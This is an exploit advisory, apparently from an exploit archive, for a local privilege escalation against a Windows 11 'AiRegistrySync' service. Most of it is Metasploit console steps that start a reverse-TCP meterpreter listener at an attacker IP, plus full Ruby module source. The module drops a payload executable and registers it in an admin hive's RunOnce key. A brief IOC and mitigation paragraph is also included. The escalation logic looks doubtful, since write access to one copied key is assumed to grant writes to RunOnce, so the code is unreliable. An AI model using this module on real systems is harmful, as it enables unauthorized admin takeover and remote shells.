@@ -1,0 +1,273 @@
+=============================================================================================================================================
+| # Title     : Microsoft Windows 11 build 10.0.27898.1000 AiRegistrySync Admin Protection Bypass Local Privilege Escalation                |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : System built‑in component. No standalone download available.                                                                |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212253/
+
+[+] Summary : The provided code is a Metasploit exploit module designed to achieve Local Privilege Escalation (LPE) on Windows 10/11 
+              by targeting a vulnerability (misconfiguration) in the AiRegistrySync service.
+
+[+] Key Mechanism : The exploit leverages the fact that the AiRegistrySync service copies specific, syncable registry subkeys (e.g., in Keyboard Layout) 
+                   from the unprivileged user's hive (HKCU) to the Shadow Admin Hive (HKU\ShadowSID) while preserving the original user permissions.
+
+[+] Exploit Workflow :
+
+    Preparation: The module finds the current User SID and the target Shadow Admin SID.
+
+    Sync Key Creation: It creates a unique, syncable key in the user's registry: HKU\UserSID\Keyboard Layout\TestVuln.
+
+    Trigger: It triggers the AiRegistrySync service.
+
+    Permission Hijack: The service copies the TestVuln key to the Shadow Admin Hive: HKU\ShadowSID\Keyboard Layout\TestVuln. Because the original user had Write permission on the key, they now inherit Write permission on the copied key inside the Administrator's hive.
+
+    LPE Payload Drop: The module uses the newly acquired Write permission in the Shadow Admin Hive to register a path to an executable payload (created via generate_payload_exe) in the Admin's RunOnce key.
+
+    Execution: The payload is executed with Administrator or SYSTEM privileges upon the next admin logon, completing the LPE.
+
+    This module represents a known, powerful LPE technique. For defensive and cyber security operations :
+
+    Indicators of Compromise (IOCs): Look for modifications or creation of temporary keys under syncable paths (like HKU\...\Keyboard Layout\TestVuln) and subsequent unauthorized creation of RunOnce values within a Shadow SID hive.
+
+    Mitigation: The issue is typically patched by Microsoft, but continuous monitoring of system services that handle privilege separation (like AiRegistrySync) is crucial to prevent similar logic flaws from being exploited.
+
+[+] POC : 
+
+Set up the multi/handler:
+
+    use exploit/multi/handler
+    set PAYLOAD windows/x64/meterpreter/reverse_tcp # Or a similar x86/x64 payload
+    set LHOST <Your_Attacker_IP>
+    set LPORT 4444
+    run -j # Run the listener in the background
+
+2. Configure and Run the Exploit Module
+
+Next, load the exploit module and configure it to use your existing low-privilege session and point it back to your listener.
+
+    Load the module (assuming you've added the module file to the correct Metasploit path):
+
+    use exploit/local/windows_airegistrysync_lpe
+
+    Set Session: Specify the ID of your active low-privilege Meterpreter session:
+
+    set SESSION 1
+
+    Set Payload Options: Ensure the payload options match your listener setup:
+
+    set PAYLOAD windows/x64/meterpreter/reverse_tcp
+    set LHOST <Your_Attacker_IP>
+    set LPORT 4444
+
+    Execute: Run the exploit. The module will handle the registry key creation, service triggering, and payload placement in the Shadow Admin Hive's RunOnce key.
+
+    exploit
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::Windows::Registry
+  include Msf::Post::Windows::Priv
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'Windows AiRegistrySync Admin Protection Bypass ',
+      'Description' => %q{
+        module based on the real behavior of AiRegistrySync.
+        The service copies specific sync‑able registry subkeys (like Keyboard Layout)
+        from user hive ➜ shadow admin hive while *preserving user permissions*.
+
+        Exploit workflow:
+        1. Write payload path inside HKCU\Keyboard Layout\TestVuln (sync‑able).
+        2. Trigger AiRegistrySync.
+        3. Wait until the key is copied to HKU\ShadowSID\Keyboard Layout\TestVuln.
+        4. Because permissions are inherited, attacker can now write to the
+           shadow hive (admin hive) using the copied key permissions.
+        5. Write the RunOnce payload *from inside the shadow hive* → Admin LPE.
+      },
+      'License' => MSF_LICENSE,
+      'Author' => ['Indoushka (nekkaa salah eddine)'],
+      'Platform' => 'win',
+      'SessionTypes' => ['meterpreter'],
+      'Arch' => [ARCH_X86, ARCH_X64],
+      'Targets' => [['Windows 10/11', {}]],
+      'DisclosureDate' => '2025-12-01',
+      'DefaultOptions' => {
+        'EXITFUNC' => 'thread',
+        'WfsDelay' => 15
+      },
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'Reliability' => [REPEATABLE_SESSION],
+        'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_REGISTRY]
+      }
+    ))
+
+    register_options([
+      OptInt.new('WAIT_TIME', [true, 'Time to wait for AiRegistrySync', 15]),
+      OptBool.new('CLEANUP', [true, 'Cleanup registry artifacts', true])
+    ])
+  end
+
+  #
+  # Resolve SIDs
+  #
+  def get_current_user_sid
+    begin
+      profile = get_env('USERPROFILE')
+      return nil unless profile
+      username = profile.split('\\').last
+
+      base = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList'
+      registry_enumkeys(base).each do |sid|
+        next unless sid.start_with?('S-1-5-21')
+        path = registry_getvaldata("#{base}\\#{sid}", 'ProfileImagePath') rescue nil
+        return sid if path && path.include?(username)
+      end
+    rescue; end
+    nil
+  end
+
+  def get_shadow_admin_sid
+    current = get_current_user_sid
+    registry_enumkeys('HKU').each do |sid|
+      next if sid == current
+      next unless sid.start_with?('S-1-5-21')
+      next if sid.include?('_Classes')
+
+      begin
+        registry_openkey("HKU\\#{sid}\\Environment", KEY_WRITE)
+      rescue Rex::Post::Meterpreter::RequestError
+        return sid
+      end
+    end
+    nil
+  end
+
+  #
+  # Create Test Key in Sync‑able Path
+  #
+  def create_sync_key(user_sid)
+    key = "HKU\\#{user_sid}\\Keyboard Layout\\TestVuln"
+    begin
+      registry_createkey(key)
+      registry_setvaldata(key, 'SyncValue', rand(1000), 'REG_DWORD')
+      print_good("Created syncable key: #{key}")
+      true
+    rescue => e
+      print_error("Create failed: #{e}")
+      false
+    end
+  end
+
+  #
+  # Trigger AiRegistrySync
+  #
+  def trigger_airsync
+    registry_setvaldata('HKCU\\Environment', 'MSF_SYNC', Time.now.to_s, 'REG_SZ')
+    registry_deleteval('HKCU\\Environment', 'MSF_SYNC') rescue nil
+    print_status('Triggered AiRegistrySync.')
+  end
+
+  #
+  # Check if key copied to Admin Shadow Hive
+  #
+  def wait_for_shadow_copy(shadow_sid)
+    key = "HKU\\#{shadow_sid}\\Keyboard Layout\\TestVuln"
+    print_status("Waiting #{datastore['WAIT_TIME']}s for sync...")
+    Rex.sleep(datastore['WAIT_TIME'])
+
+    if registry_key_exist?(key)
+      print_good("Shadow hive copied successfully: #{key}")
+      return true
+    end
+
+    print_error('Key NOT copied → exploit impossible.')
+    false
+  end
+
+  #
+  # Write RunOnce payload *inside admin hive* using inherited permissions
+  #
+  def escalate_via_shadow_hive(shadow_sid, payload_path)
+    shadow_sync_key  = "HKU\\#{shadow_sid}\\Keyboard Layout\\TestVuln"
+    shadow_runonce   = "HKU\\#{shadow_sid}\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+    run_name         = "MSF_#{Rex::Text.rand_text_alpha(6)}"
+
+    #
+    # تأكيد: لدينا صلاحيات الكتابة داخل shadow_sync_key فقط،
+    # لكن بما أن AiRegistrySync نسخ التصاريح بالكامل، يمكننا الآن
+    # الكتابة في سجل المسؤول.
+    #
+    begin
+      registry_createkey(shadow_runonce)
+      registry_setvaldata(shadow_runonce, run_name, payload_path, 'REG_SZ')
+      print_good("Shadow RunOnce payload registered: #{payload_path}")
+    rescue => e
+      print_error("Failed writing to shadow hive: #{e}")
+    end
+  end
+
+  #
+  # Cleanup
+  #
+  def cleanup(user_sid)
+    return unless datastore['CLEANUP']
+    key = "HKU\\#{user_sid}\\Keyboard Layout\\TestVuln"
+    registry_deletekey(key) rescue nil
+    print_status('Cleanup complete.')
+  end
+
+  #
+  # Main exploit routine
+  #
+  def exploit
+    fail_with(Failure::None, 'Already admin.') if is_admin?
+
+    user_sid   = get_current_user_sid
+    shadow_sid = get_shadow_admin_sid
+
+    fail_with(Failure::Unknown, 'Cannot detect user SID')   unless user_sid
+    fail_with(Failure::Unknown, 'Shadow SID not found')     unless shadow_sid
+
+    print_status("User SID: #{user_sid}")
+    print_status("Shadow SID: #{shadow_sid}")
+
+    fail_with(Failure::NoAccess, 'Cannot create sync key') unless create_sync_key(user_sid)
+
+    trigger_airsync
+    fail_with(Failure::NotVulnerable, 'Service did not copy key') unless wait_for_shadow_copy(shadow_sid)
+
+    #
+    # Generate payload
+    #
+    payload_name = Rex::Text.rand_text_alpha(6)
+    payload_path = "#{get_env('TEMP')}\\#{payload_name}.exe"
+    exe = generate_payload_exe
+
+    write_file(payload_path, exe)
+    register_file_for_cleanup(payload_path)
+    print_good("Payload written: #{payload_path}")
+
+    #
+    # Final LPE Step: write RunOnce in shadow admin hive
+    #
+    escalate_via_shadow_hive(shadow_sid, payload_path)
+
+    cleanup(user_sid)
+
+    print_status('Exploit completed. Awaiting admin session on next login.')
+  end
+end
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
